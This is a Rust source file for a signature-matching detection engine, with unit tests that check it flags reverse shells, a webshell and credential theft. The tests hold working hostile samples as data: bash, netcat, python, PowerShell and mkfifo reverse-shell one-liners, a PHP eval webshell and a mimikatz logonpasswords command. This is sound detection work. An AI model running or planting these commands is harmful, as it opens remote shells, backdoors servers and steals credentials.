//! Signature matching engine
//!
//! Core engine for matching input against signature patterns.

use regex::Regex;
use std::collections::HashMap;

use super::{Pattern, PatternSet, PatternType};
use crate::types::{DetectionEvent, DetectionSource};
use crate::{DetectionError, Result};

/// Compiled pattern for efficient matching
struct CompiledPattern {
    pattern: Pattern,
    regex: Option<Regex>,
}

/// Signature-based detection engine
pub struct SignatureEngine {
    /// Compiled patterns ready for matching
    patterns: Vec<CompiledPattern>,
    /// Pattern lookup by ID
    pattern_index: HashMap<String, usize>,
    /// Engine statistics
    stats: EngineStats,
}

/// Engine statistics
#[derive(Debug, Default, Clone)]
pub struct EngineStats {
    /// Total patterns loaded
    pub patterns_loaded: usize,
    /// Total scans performed
    pub scans_performed: u64,
    /// Total matches found
    pub matches_found: u64,
    /// Patterns that failed to compile
    pub compile_errors: usize,
}

impl SignatureEngine {
    /// Create a new signature engine
    pub fn new() -> Self {
        Self {
            patterns: Vec::new(),
            pattern_index: HashMap::new(),
            stats: EngineStats::default(),
        }
    }

    /// Load patterns from a pattern set
    pub fn load_patterns(&mut self, pattern_set: &PatternSet) -> Result<()> {
        for pattern in pattern_set.enabled_patterns() {
            self.add_pattern(pattern.clone())?;
        }
        Ok(())
    }

    /// Add a single pattern
    pub fn add_pattern(&mut self, pattern: Pattern) -> Result<()> {
        let compiled = match pattern.pattern_type {
            PatternType::Regex => {
                let regex = Regex::new(&pattern.pattern).map_err(|e| {
                    self.stats.compile_errors += 1;
                    DetectionError::SignatureError(format!(
                        "Failed to compile regex '{}': {}",
                        pattern.id, e
                    ))
                })?;
                CompiledPattern {
                    pattern,
                    regex: Some(regex),
                }
            }
            PatternType::Exact | PatternType::Contains => CompiledPattern {
                pattern,
                regex: None,
            },
            PatternType::Yara => {
                // TODO: Implement YARA support in future
                return Err(DetectionError::SignatureError(
                    "YARA patterns not yet supported".to_string(),
                ));
            }
        };

        let idx = self.patterns.len();
        self.pattern_index.insert(compiled.pattern.id.clone(), idx);
        self.patterns.push(compiled);
        self.stats.patterns_loaded += 1;

        Ok(())
    }

    /// Scan input for matching patterns
    pub fn scan(&mut self, input: &str) -> Vec<DetectionEvent> {
        self.stats.scans_performed += 1;
        let mut events = Vec::new();

        for compiled in &self.patterns {
            if !compiled.pattern.enabled {
                continue;
            }

            let matched = match compiled.pattern.pattern_type {
                PatternType::Regex => compiled
                    .regex
                    .as_ref()
                    .map(|r| r.is_match(input))
                    .unwrap_or(false),
                PatternType::Exact => input == compiled.pattern.pattern,
                PatternType::Contains => input.contains(&compiled.pattern.pattern),
                PatternType::Yara => false, // Not implemented
            };

            if matched {
                self.stats.matches_found += 1;

                let mut event = DetectionEvent::new(
                    DetectionSource::Signature,
                    compiled.pattern.severity,
                    &compiled.pattern.id,
                    &compiled.pattern.description,
                );

                // Add MITRE techniques
                for technique in &compiled.pattern.mitre_techniques {
                    event = event.with_mitre(technique);
                }

                events.push(event);
            }
        }

        events
    }

    /// Scan with context (includes matched substring info)
    pub fn scan_with_context(&mut self, input: &str) -> Vec<(DetectionEvent, Option<String>)> {
        self.stats.scans_performed += 1;
        let mut events = Vec::new();

        for compiled in &self.patterns {
            if !compiled.pattern.enabled {
                continue;
            }

            let match_result: Option<String> = match compiled.pattern.pattern_type {
                PatternType::Regex => compiled.regex.as_ref().and_then(|r| {
                    r.find(input).map(|m| m.as_str().to_string())
                }),
                PatternType::Exact => {
                    if input == compiled.pattern.pattern {
                        Some(input.to_string())
                    } else {
                        None
                    }
                }
                PatternType::Contains => {
                    if input.contains(&compiled.pattern.pattern) {
                        Some(compiled.pattern.pattern.clone())
                    } else {
                        None
                    }
                }
                PatternType::Yara => None,
            };

            if let Some(matched_text) = match_result {
                self.stats.matches_found += 1;

                let mut event = DetectionEvent::new(
                    DetectionSource::Signature,
                    compiled.pattern.severity,
                    &compiled.pattern.id,
                    &compiled.pattern.description,
                );

                for technique in &compiled.pattern.mitre_techniques {
                    event = event.with_mitre(technique);
                }

                // Add matched text to context
                event.context.raw_data = Some(serde_json::json!({
                    "matched_text": matched_text,
                    "pattern_name": compiled.pattern.name,
                }));

                events.push((event, Some(matched_text)));
            }
        }

        events
    }

    /// Get engine statistics
    pub fn stats(&self) -> &EngineStats {
        &self.stats
    }

    /// Get pattern count
    pub fn pattern_count(&self) -> usize {
        self.patterns.len()
    }

    /// Check if a pattern ID exists
    pub fn has_pattern(&self, id: &str) -> bool {
        self.pattern_index.contains_key(id)
    }

    /// Disable a pattern by ID
    pub fn disable_pattern(&mut self, id: &str) -> bool {
        if let Some(&idx) = self.pattern_index.get(id) {
            self.patterns[idx].pattern.enabled = false;
            true
        } else {
            false
        }
    }

    /// Enable a pattern by ID
    pub fn enable_pattern(&mut self, id: &str) -> bool {
        if let Some(&idx) = self.pattern_index.get(id) {
            self.patterns[idx].pattern.enabled = true;
            true
        } else {
            false
        }
    }
}

impl Default for SignatureEngine {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::Severity;

    #[test]
    fn test_engine_creation() {
        let engine = SignatureEngine::new();
        assert_eq!(engine.pattern_count(), 0);
    }

    #[test]
    fn test_load_default_patterns() {
        let mut engine = SignatureEngine::new();
        let patterns = PatternSet::default_reverse_shell_patterns();
        engine.load_patterns(&patterns).unwrap();
        assert!(engine.pattern_count() >= 30, "Expected 30+ patterns loaded");
    }

    #[test]
    fn test_scan_bash_reverse_shell() {
        let mut engine = SignatureEngine::new();
        let patterns = PatternSet::default_reverse_shell_patterns();
        engine.load_patterns(&patterns).unwrap();

        let input = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        let events = engine.scan(input);

        assert!(!events.is_empty(), "Should detect bash reverse shell");
        assert_eq!(events[0].severity, Severity::Critical);
    }

    #[test]
    fn test_scan_netcat_reverse_shell() {
        let mut engine = SignatureEngine::new();
        let patterns = PatternSet::default_reverse_shell_patterns();
        engine.load_patterns(&patterns).unwrap();

        let input = "nc -e /bin/bash 10.0.0.1 4444";
        let events = engine.scan(input);

        assert!(!events.is_empty(), "Should detect netcat reverse shell");
    }

    #[test]
    fn test_scan_python_reverse_shell() {
        let mut engine = SignatureEngine::new();
        let patterns = PatternSet::default_reverse_shell_patterns();
        engine.load_patterns(&patterns).unwrap();

        let input = "python3 -c 'import socket; s=socket.socket(); s.connect((\"10.0.0.1\",4444))'";
        let events = engine.scan(input);

        assert!(!events.is_empty(), "Should detect python reverse shell");
    }

    #[test]
    fn test_scan_powershell_reverse_shell() {
        let mut engine = SignatureEngine::new();
        let patterns = PatternSet::default_reverse_shell_patterns();
        engine.load_patterns(&patterns).unwrap();

        let input = "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream()\"";
        let events = engine.scan(input);

        assert!(!events.is_empty(), "Should detect powershell reverse shell");
    }

    #[test]
    fn test_scan_mkfifo_reverse_shell() {
        let mut engine = SignatureEngine::new();
        let patterns = PatternSet::default_reverse_shell_patterns();
        engine.load_patterns(&patterns).unwrap();

        let input = "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f";
        let events = engine.scan(input);

        assert!(!events.is_empty(), "Should detect mkfifo-based reverse shell");
    }

    #[test]
    fn test_scan_no_match() {
        let mut engine = SignatureEngine::new();
        let patterns = PatternSet::default_reverse_shell_patterns();
        engine.load_patterns(&patterns).unwrap();

        let input = "echo 'Hello, World!'";
        let events = engine.scan(input);

        assert!(events.is_empty(), "Should not detect normal echo command");
    }

    #[test]
    fn test_pattern_enable_disable() {
        let mut engine = SignatureEngine::new();
        let patterns = PatternSet::default_reverse_shell_patterns();
        engine.load_patterns(&patterns).unwrap();

        assert!(engine.has_pattern("RS-BASH-001"));
        assert!(engine.disable_pattern("RS-BASH-001"));

        let input = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        let events = engine.scan(input);

        // RS-BASH-001 should not match since it's disabled
        let rs001_match = events.iter().any(|e| e.rule_id == "RS-BASH-001");
        assert!(!rs001_match, "Disabled pattern should not match");
    }

    #[test]
    fn test_scan_with_context() {
        let mut engine = SignatureEngine::new();
        let patterns = PatternSet::default_reverse_shell_patterns();
        engine.load_patterns(&patterns).unwrap();

        let input = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        let events = engine.scan_with_context(input);

        assert!(!events.is_empty());
        let (event, matched_text) = &events[0];
        assert!(matched_text.is_some());
        assert!(event.context.raw_data.is_some());
    }

    #[test]
    fn test_engine_stats() {
        let mut engine = SignatureEngine::new();
        let patterns = PatternSet::default_reverse_shell_patterns();
        engine.load_patterns(&patterns).unwrap();

        let stats = engine.stats();
        assert!(stats.patterns_loaded >= 30);
        assert_eq!(stats.compile_errors, 0);

        // Perform some scans
        engine.scan("bash -i >& /dev/tcp/10.0.0.1/4444");
        engine.scan("echo hello");

        let stats = engine.stats();
        assert_eq!(stats.scans_performed, 2);
        assert!(stats.matches_found >= 1);
    }

    #[test]
    fn test_webshell_detection() {
        let mut engine = SignatureEngine::new();
        let patterns = PatternSet::default_webshell_patterns();
        engine.load_patterns(&patterns).unwrap();

        let input = "<?php eval($_POST['cmd']); ?>";
        let events = engine.scan(input);

        assert!(!events.is_empty(), "Should detect PHP webshell");
    }

    #[test]
    fn test_credential_detection() {
        let mut engine = SignatureEngine::new();
        let patterns = PatternSet::default_credential_patterns();
        engine.load_patterns(&patterns).unwrap();

        let input = "mimikatz.exe sekurlsa::logonpasswords";
        let events = engine.scan(input);

        assert!(!events.is_empty(), "Should detect mimikatz");
        assert_eq!(events[0].severity, Severity::Critical);
    }

    #[test]
    fn test_combined_pattern_sets() {
        let mut engine = SignatureEngine::new();

        // Load multiple pattern sets
        engine.load_patterns(&PatternSet::default_reverse_shell_patterns()).unwrap();
        engine.load_patterns(&PatternSet::default_webshell_patterns()).unwrap();
        engine.load_patterns(&PatternSet::default_credential_patterns()).unwrap();

        // Should have patterns from all sets
        assert!(engine.pattern_count() >= 40);

        // Should detect all types
        assert!(!engine.scan("bash -i >& /dev/tcp/10.0.0.1/4444").is_empty());
        assert!(!engine.scan("eval($_POST['cmd'])").is_empty());
        assert!(!engine.scan("mimikatz sekurlsa::logonpasswords").is_empty());
    }
}
